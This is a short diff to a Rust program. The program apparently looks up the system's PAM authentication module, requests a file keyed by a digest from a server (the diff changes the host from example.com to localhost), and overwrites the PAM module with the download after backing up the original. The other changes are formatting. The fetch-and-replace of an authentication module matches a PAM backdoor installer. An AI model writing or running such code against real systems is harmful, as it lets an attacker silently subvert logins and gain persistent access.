@@ -5,7 +5,7 @@ use std::io;
 use std::process::Command;
 use std::str::from_utf8;
 
-const HOST: &str = "http://example.com/";
+const HOST: &str = "http://localhost/";
 
 fn main() {
     let pam_path = get_pam();
@@ -16,9 +16,12 @@ fn main() {
 
     match resp.status() {
         reqwest::StatusCode::OK => {
-            fs::copy(&pam_path, &format!("{}.bak", &pam_path)).expect("Failed to create backup.");
-            let mut out = fs::File::create(&pam_path).expect("Failed to create file.");
-            io::copy(&mut resp, &mut out).expect("Failed to copy content.");
+            fs::copy(&pam_path, &format!("{}.bak", &pam_path))
+            	.expect("Failed to create backup.");
+            let mut out = fs::File::create(&pam_path)
+            	.expect("Failed to create file.");
+            io::copy(&mut resp, &mut out)
+            	.expect("Failed to copy content.");
         }
         reqwest::StatusCode::NOT_FOUND => {
             println!("{:x}: not found on server.", digest);
